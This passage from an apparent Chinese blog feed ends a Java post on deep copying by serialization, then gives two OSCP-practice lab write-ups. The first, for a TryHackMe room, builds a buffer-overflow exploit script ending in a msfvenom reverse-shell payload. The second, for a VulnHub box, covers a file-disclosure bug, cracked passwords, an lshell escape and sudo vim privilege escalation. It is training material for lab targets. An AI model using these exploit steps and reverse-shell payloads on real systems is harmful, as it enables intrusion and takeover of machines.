class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        B b = <span class="keyword">new</span> B();</span><br><span class="line">        B bb = (B)b.clone();</span><br><span class="line">        bb.b_value = <span class="number">200</span>;</span><br><span class="line">        bb.b_c_class.c_value = <span class="number">300</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><p><strong>Debug显示:</strong></p><p>b = {B@784}<br>&nbsp;&nbsp;&nbsp; b_value = 1<br>&nbsp;&nbsp;&nbsp; b_c_class = <span style="color:red">{C@787} </span><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  c_value = <span style="color:blue">100</span><br>bb = {B@785}<br>&nbsp;&nbsp;&nbsp; b_value = 200<br>&nbsp;&nbsp;&nbsp; b_c_class = <span style="color:red">{C@786} </span><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  c_value = <span style="color:blue">300</span></p><br><p>现在确实可以将 对象中的对象 进行拷贝了。但是如果对象的层数很多的话，就显得很麻烦了。</p><p>还可以通过序列化的方式来进行对象拷贝，这种方式更方便。</p><br><p>序列化的时候需要注意：被序列化的类需要实现 <em>Serializable</em> 接口</p><br><p><strong>Demo:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> <span class="keyword">implements</span> <span class="title">Cloneable</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> c_value = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">public</span> Integer[] c_array = &#123;<span class="number">20</span>&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">implements</span> <span class="title">Cloneable</span>, <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> b_value = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> C b_c_class = <span class="keyword">new</span> C();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> B <span class="title">serialize_clone</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        B bClone = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//序列化本类</span></span><br><span class="line">            ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line"></span><br><span class="line">            oos.writeObject(<span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">            ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">            ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">            bClone = (B) ois.readObject();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bClone;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        B b = <span class="keyword">new</span> B();</span><br><span class="line">        B bb = b.serialize_clone();</span><br><span class="line">        bb.b_value = <span class="number">200</span>;</span><br><span class="line">        bb.b_c_class.c_value = <span class="number">300</span>;</span><br><span class="line">        bb.b_c_class.c_array[<span class="number">0</span>] = <span class="number">30</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p><strong>Debug显示:</strong></p><p>b = {B@945}<br>&nbsp;&nbsp;&nbsp; b_value = 1<br>&nbsp;&nbsp;&nbsp; b_c_class = <span style="color:red">{C@950} </span><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  c_value = 100<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  c_array = <span style="color:red">{Integer[1]@951} </span><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   0 = {Integer@952} 20<br>bb = {B@946}<br>&nbsp;&nbsp;&nbsp; b_value = 200<br>&nbsp;&nbsp;&nbsp; b_c_class = <span style="color:red">{C@947} </span><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  c_value = 300<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  c_array = <span style="color:red">{Integer[1]@948} </span><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   0 = {Integer@949} 30</p><br><p><strong>Reference:</strong></p><p><a href="https://www.cnblogs.com/fnlingnzb-learner/p/10649509.html">https://www.cnblogs.com/fnlingnzb-learner/p/10649509.html</a></p>]]></content>
    
    
    <summary type="html">&lt;br&gt;

&lt;p&gt;java 中 &lt;em&gt;Object&lt;/em&gt; 的操作都是引用。&lt;em&gt;原始数据类型&lt;/em&gt;操作都是值拷贝。&lt;/p&gt;
&lt;p&gt;这里的操作就包括 &lt;strong&gt;赋值&lt;/strong&gt; 和 函数&lt;strong&gt;参数传递&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>OSCP report 练手之 - tryhackme bufferoverflow</title>
    <link href="http://example.com/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/"/>
    <id>http://example.com/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/</id>
    <published>2021-02-14T09:53:02.000Z</published>
    <updated>2021-02-14T13:24:45.455Z</updated>
    
    <content type="html"><![CDATA[<p>临近  OSCP Exam了，做点 bufferoverflow 的靶机练练手。之前无意间在 twiiter 上看到了一个靶场，有 bof。遂来练手。顺便也练练 Report 的编写。</p><br><p>靶机地址：</p><p><a href="https://tryhackme.com/room/bufferoverflowprep">https://tryhackme.com/room/bufferoverflowprep</a></p><br><p>这种是最基本的 BOF，没有保护什么的，都是走个流程就差不多了。</p><p>ps:</p><p>中途吃了个饭，重启了 lab machine。导致前后机器 ip 不一致了，不要在意。。。</p><span id="more"></span><p><strong>Snooping around the target</strong></p><br><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/1.png" style="width:500px"><br><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/2.png" style="width:500px"><br><p><strong>Create a python script as exp. use msf-pattern_create to generate a string.</strong></p><p>a@kali:~/Desktop/bof$ <span style="color:blue">msf-pattern_create -l 1000</span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;PAYLOAD&quot;</span></span><br><span class="line"></span><br><span class="line">s = socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;10.10.65.218&#x27;</span>, <span class="number">1337</span>))</span><br><span class="line">print(s.recv(<span class="number">1024</span>))</span><br><span class="line">s.send(<span class="string">&#x27;OVERFLOW2 &#x27;</span>+payload)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><br><p><strong>Note the value of EIP.</strong></p><br><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/3.png" style="width:500px"><br><p><strong>Use msf-pattern_offset to get the “eip” offset</strong></p><p>a@kali:~/Desktop/bof$ <span style="color:blue">msf-pattern_offset -l 1000 -q 76413176</span></p><p>[*] Exact match at offset <span style="color:red">634</span></p><br><p><strong>ensure “eip” offset</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">634</span>+<span class="string">&quot;BBBB&quot;</span></span><br></pre></td></tr></table></figure><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/4.png" style="width:500px"><br><p><strong>check bad chars.Delete “<span style="color:red">\x00,\x0a,\x0d</span> first”</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">634</span>+<span class="string">&quot;BBBB&quot;</span>+<span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0B\x0C\x0E\x0F\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F\xA0\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF\xB0\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF\xC0\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF\xD0\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF\xE0\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF\xF0\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF&quot;</span></span><br></pre></td></tr></table></figure><br><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/5.png" style="width:500px"><br><p><strong>copy these chars,edit these like following (You can do it easily with “sublime text”):</strong></p><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/6.png" style="width:500px"><br><p><strong>create a python script to auto check bad char:</strong></p><p><a href="https://github.com/xiaopan233/OSCP-Script/blob/main/bof/badchars_check.py">https://github.com/xiaopan233/OSCP-Script/blob/main/bof/badchars_check.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">rightChars = <span class="string">&quot;\xXX\xXX\xXX......&quot;</span>  <span class="comment">#the chars in python payload</span></span><br><span class="line">memeryChars = <span class="string">&quot;\xXX\xXX\xXX......&quot;</span> <span class="comment">#chars from immunity debugger hex dump</span></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(memeryChars)):</span><br><span class="line"><span class="keyword">if</span> rightChars[i] != memeryChars[i]:</span><br><span class="line">print(<span class="string">&quot;[-] Find bad char!&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;[-] Current char: &quot;</span> + <span class="built_in">hex</span>(<span class="built_in">ord</span>(rightChars[i])))</span><br><span class="line"><span class="keyword">if</span> i != <span class="number">0</span>:</span><br><span class="line">print(<span class="string">&quot;[-] Previous char: &quot;</span> + <span class="built_in">hex</span>(<span class="built_in">ord</span>(rightChars[i-<span class="number">1</span>])))</span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">print(<span class="string">&quot;[+] Not Find bad char!&quot;</span>)</span><br></pre></td></tr></table></figure><br><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/7.png" style="width:600px"><br><p><strong>Find a bad char “<span style="color:red">\x23</span>“</strong></p><p><strong>from payload delete char “<span style="color:red">\x23</span>“.</strong></p><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">634</span>+<span class="string">&quot;BBBB&quot;</span>+<span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0B\x0C\x0E\x0F\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F\x20\x21\x22\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F\xA0\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF\xB0\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF\xC0\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF\xD0\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF\xE0\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF\xF0\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF&quot;</span></span><br></pre></td></tr></table></figure><br><p><strong>Then resend payload again.Repeat above process.Until  detect no bad char.</strong></p><br><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/8.png" style="width:500px"><br><p><strong>all detected bad chars following:</strong></p><p><span style="color:red">\x23, \x3c, \x83, \xba</span></p><p><strong>Next step.Find jmp esp address.</strong></p><p><strong>type command “<span style="color:blue">!mona modules</span>“ to detect all modules.</strong></p><p><strong>We should note the dll which without protection.For me the best dll is from the vulnnerable application.</strong></p><br><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/9.png" style="width:800px"><br><p><strong>get the opcode of “jmp esp”</strong></p><p>a@kali:~/Desktop$ <span style="color:blue">msf-nasm_shell </span><br>nasm &gt; <span style="color:blue">jmp esp</span><br>00000000  <span style="color:red">FFE4</span>              jmp esp</p><p><strong>not only “jmp esp”,but there also are “jmp ebp”,”call esp”,“jmp eax” etc.</strong></p><p>nasm &gt; <span style="color:blue">jmp ebp</span><br>00000000  <span style="color:red">FFE5</span>              jmp ebp<br>nasm &gt; <span style="color:blue">call esp</span><br>00000000  <span style="color:red">FFD4</span>              call esp<br>nasm &gt; <span style="color:blue">jmp eax</span><br>00000000  <span style="color:red">FFE0</span>              jmp eax</p><p><strong>Note that: use diffrent opcode, the shellcode location we put is diffrent too.</strong></p><p><strong>Here I use the first dll module “essfunc.dll”.head over to search the address of “jmp esp” opcode</strong></p><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/10.png" style="width:500px"><br><p><strong>We head over to test address “<span style="color:red">0x625011af</span>“.</strong></p><p><strong>“jmp esp” will change eip to the address where esp pointed.</strong></p><p><strong>We can put some “<span style="color:red">\x90</span>“ after “jmp esp” address in our payload to verify if it work.</strong></p><p><strong>change python payload to following:</strong></p><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">634</span>+<span class="string">&quot;\xaf\x11\x50\x62&quot;</span>+<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span> <span class="comment">#note that return address should be reverse.0x625011af should be 0xaf115062</span></span><br></pre></td></tr></table></figure><p><strong>Check if  it work in immunity debugger:</strong></p><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/11.png" style="width:800px"><br><p><strong>It worked!</strong></p><p><strong>Use msfvenom to generate shellcode.</strong></p><p><strong>command:</strong></p><p><span style="color:blue">msfvenom -p windows/shell_reverse_tcp LHOST=10.8.132.252 LPORT=443 -f python -b “\x00\x0a\x0d\x23\x3c\x83\xba”</span></p><br><p><strong>modify our exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">......  <span class="comment"># here are the shellcode which generated by msfvenom</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">634</span>+<span class="string">&quot;\xaf\x11\x50\x62&quot;</span>+<span class="string">&quot;\x90&quot;</span>*<span class="number">32</span>+buf  <span class="comment">#make sure there is some nop between shellcode and return address</span></span><br><span class="line"></span><br><span class="line">s = socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;10.10.15.141&#x27;</span>, <span class="number">1337</span>))</span><br><span class="line">print(s.recv(<span class="number">1024</span>))</span><br><span class="line">s.send(<span class="string">&#x27;OVERFLOW2 &#x27;</span>+payload)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><br><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/12.png" style="width:800px"><br><p><strong>BOOM!!</strong></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;临近  OSCP Exam了，做点 bufferoverflow 的靶机练练手。之前无意间在 twiiter 上看到了一个靶场，有 bof。遂来练手。顺便也练练 Report 的编写。&lt;/p&gt;
&lt;br&gt;

&lt;p&gt;靶机地址：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/bufferoverflowprep&quot;&gt;https://tryhackme.com/room/bufferoverflowprep&lt;/a&gt;&lt;/p&gt;
&lt;br&gt;

&lt;p&gt;这种是最基本的 BOF，没有保护什么的，都是走个流程就差不多了。&lt;/p&gt;
&lt;p&gt;ps:&lt;/p&gt;
&lt;p&gt;中途吃了个饭，重启了 lab machine。导致前后机器 ip 不一致了，不要在意。。。&lt;/p&gt;</summary>
    
    
    
    <category term="OSCP" scheme="http://example.com/categories/OSCP/"/>
    
    
    <category term="OSCP" scheme="http://example.com/tags/OSCP/"/>
    
  </entry>
  
  <entry>
    <title>OSCP report 练手之 - vulnhub development-improved</title>
    <link href="http://example.com/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/"/>
    <id>http://example.com/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/</id>
    <published>2021-02-11T14:10:02.000Z</published>
    <updated>2021-02-28T12:06:44.738Z</updated>
    
    <content type="html"><![CDATA[<p>临近  OSCP Exam了，做点 Vulnhub 的靶机练练手，顺便也练练 Report 的编写。</p><br><p>靶机地址：</p><p><a href="https://www.vulnhub.com/entry/digitalworldlocal-development,280/">https://www.vulnhub.com/entry/digitalworldlocal-development,280/</a></p><br><p> <strong>stuck:</strong></p><p>1、关键时候。。忘了查看网页源代码。关看提示的字去了，看了攻略才发现藏在网页源代码里。。。犯了低级错误。。</p><p>2、网页报错的时候，没有想到去搜索文件名。看了攻略才发现百度能搜到相关的 exploit</p><br><p>OSCP Exam Report 的模板在此：</p><p><a href="https://www.offensive-security.com/pwk-online/PWK-Example-Report-v1.pdf">https://www.offensive-security.com/pwk-online/PWK-Example-Report-v1.pdf</a></p><br><p>由于 Report 中只有第三节是重点，所以本节就直接仿照第三节来写了。</p><span id="more"></span><h2 id="3-2-Report-–-Service-Enumeration"><a href="#3-2-Report-–-Service-Enumeration" class="headerlink" title="3.2 Report – Service Enumeration"></a>3.2 Report – Service Enumeration</h2><table><thead><tr><th>Server IP Address</th><th>Ports Open</th><th>Service / Banner</th></tr></thead><tbody><tr><td>192.168.92.164</td><td>22， 8080</td><td>ssh / Apache</td></tr></tbody></table><br><h2 id="3-3-Report-–-Penetration"><a href="#3-3-Report-–-Penetration" class="headerlink" title="3.3 Report – Penetration"></a>3.3 Report – Penetration</h2><p><strong>Vulnerability Exploited:</strong>  <strong><span style="color:blue">SiTeFiLo File Disclosure vulnerability</span></strong></p><p><strong>System Vulnerable:</strong> 192.168.92.164</p><p><strong>Vulnerability Explanation:</strong> The Simple Text-File Login script (SiTeFiLo) suffers from a File Disclosure vulnerability . Leak a ssh account username and password.This vulnerability was used to obtain a low privilege shell.</p><p><strong>Privilege Escalation Vulnerability:</strong> Credential leak and abuse sudo permission</p><p><strong>Vulnerability Fix:</strong> Update SiTeFiLo to the lasted version</p><p><strong>Severity:</strong> <strong><span style="color:red">Critical</span></strong></p><br><p><strong>Information Gathering:</strong></p><br><p>kali@kali:~/Desktop$ <strong><span style="color:blue">sudo nmap -sV 192.168.92.164 -p 1-65535 -n</span></strong></p><p>……</p><p>PORT     STATE SERVICE     VERSION</p><p><strong><span style="color:red">22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span></strong></p><p>113/tcp  open  ident?</p><p>139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</p><p>445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</p><p><strong><span style="color:red">8080/tcp open  http-proxy  IIS 6.0</span></strong></p><br><p><strong>Browse port 8080 web page.View the source code.Note these stuff:</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/1.png" style="width:800px"><br><p><strong>Browse url <a href="http://192.168.92.164:8080/html_pages">http://192.168.92.164:8080/html_pages</a>. “development” may be a hint</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/2.png" style="width:800px"><br><p><strong>Browse url <a href="http://192.168.92.164:8080/development.html">http://192.168.92.164:8080/development.html</a>. View the source code.Find an intersting page</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/3.png" style="width:800px"><br><p><strong>Browse url <a href="http://192.168.92.164:8080/developmentsecretpage/">http://192.168.92.164:8080/developmentsecretpage/</a>. Find a link</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/4.png" style="width:800px"><br><p><strong>Browse url <a href="http://192.168.92.164:8080/developmentsecretpage/patrick.php">http://192.168.92.164:8080/developmentsecretpage/patrick.php</a>. Find a link again</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/5.png" style="width:800px"><br><p><strong>Browse url <a href="http://192.168.92.164:8080/developmentsecretpage/patrick.php?logout=1">http://192.168.92.164:8080/developmentsecretpage/patrick.php?logout=1</a>. Try to submit the form</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/6.png" style="width:800px"><br><p><strong>After submit the form.Get an error</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/7.png" style="width:800px"><br><p><strong>Searching the file name in Google.Get a sensitive data disclosure bug</strong></p><p><strong>Reference:</strong></p><p><a href="https://www.exploit-db.com/exploits/7444">https://www.exploit-db.com/exploits/7444</a></p><br><p><strong>Browse url <a href="http://192.168.92.164:8080/developmentsecretpage/slog_users.txt">http://192.168.92.164:8080/developmentsecretpage/slog_users.txt</a>. Get four accounts’ username and password</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/8.png" style="width:800px"><br><p><strong>Credentials here:</strong></p><p>admin, 3cb1d13bb83ffff2defe8d1443d3a0eb</p><p>intern, 4a8a2b374f463b7aedbb44a066363b81</p><p>patrick, 87e6d56ce79af90dbe07d387d3d0579e</p><p>qiu, ee64497098d0926d198f54f6d5431f98</p><br><p><strong>go to <a href="https://www.somd5.com/">https://www.somd5.com/</a> website to crack above password md5 hash.</strong></p><p><strong>Plaintext username and password here:</strong></p><p>patrick:P@ssw0rd25</p><p>intern:12345678900987654321</p><p>qiu:qiu</p><br><p><strong>Try to use above username and password logging ssh. Only user “intern” logging successfully. But our shell is a limited shell named “lshell”</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/9.png" style="width:500px"><br><p><strong>note that we can use command “echo”</strong></p><p><strong>escape payload:</strong></p><p><span style="color:blue">echo &amp;&amp; ‘bash’</span></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/10.png" style="width:500px"><br><p><strong>Enum target information.</strong></p><p><span style="color:blue">cat /etc/passwd</span></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/11.png" style="width:800px"><br><p><strong>Note there a user “patrick”. We have this account’s password by SiTeFiLo “sensitive data disclosure bug” before.</strong></p><p><strong>Try to use command “su” to privilege lateral move to user <span style="color:red">“patrick”</span> associated password <span style="color:red">“P@ssw0rd25”</span>.</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/12.png" style="width:500px"><br><p><strong>Eunmeration the sudo Permissions for user “patrick”</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/13.png" style="width:500px"><br><p><strong>use vim to get root permission.</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/14.png" style="width:500px"><br><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/15.png" style="width:500px"><br><p><strong>Proof:</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/16.png" style="width:800px">]]></content>
    
    
    <summary type="html">&lt;p&gt;临近  OSCP Exam了，做点 Vulnhub 的靶机练练手，顺便也练练 Report 的编写。&lt;/p&gt;
&lt;br&gt;

&lt;p&gt;靶机地址：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.vulnhub.com/entry/digitalworldlocal-development,280/&quot;&gt;https://www.vulnhub.com/entry/digitalworldlocal-development,280/&lt;/a&gt;&lt;/p&gt;
&lt;br&gt;

&lt;p&gt; &lt;strong&gt;stuck:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1、关键时候。。忘了查看网页源代码。关看提示的字去了，看了攻略才发现藏在网页源代码里。。。犯了低级错误。。&lt;/p&gt;
&lt;p&gt;2、网页报错的时候，没有想到去搜索文件名。看了攻略才发现百度能搜到相关的 exploit&lt;/p&gt;
&lt;br&gt;

&lt;p&gt;OSCP Exam Report 的模板在此：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.offensive-security.com/pwk-online/PWK-Example-Report-v1.pdf&quot;&gt;https://www.offensive-security.com/pwk-online/PWK-Example-Report-v1.pdf&lt;/a&gt;&lt;/p&gt;
